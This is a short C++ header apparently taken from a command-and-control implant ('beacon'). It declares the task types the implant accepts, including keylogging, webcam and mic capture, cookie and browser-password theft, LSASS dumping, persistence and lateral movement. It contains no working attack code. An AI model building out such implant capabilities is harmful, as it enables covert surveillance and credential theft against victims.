#pragma once

#include <string>
#include <vector>

namespace beacon {

enum class TaskType {
    SCREENSHOT,
    WEBCAM,
    MIC,
    SHELL,
    FILE_DOWNLOAD,
    FILE_UPLOAD,
    WIFI_DUMP,
    COOKIE_STEAL,
    BROWSER_PASS,
    INSTALLED_APPS,
    WEBCAM_STREAM,
    SCREEN_STREAM,
    ISHELL,
    KEYLOG,
    INJECT,
    SYSINFO,
    DEEP_RECON,
    BROWSE_FS,
    EXECUTE_ASSEMBLY,
    SOCKS_PROXY,
    ADV_PERSISTENCE,
    DUMP_LSASS,
    LATERAL_RCE,
    LATERAL_WIRELESS,
    LATERAL_SVC,
    LATERAL_TASK,
    AD_ENUM,
    GET_LOGS,
    UNKNOWN // For tasks that don't map to a known type
};

struct Task {
    std::string task_id;
    TaskType type;
    std::string cmd;
};

} // namespace beacon
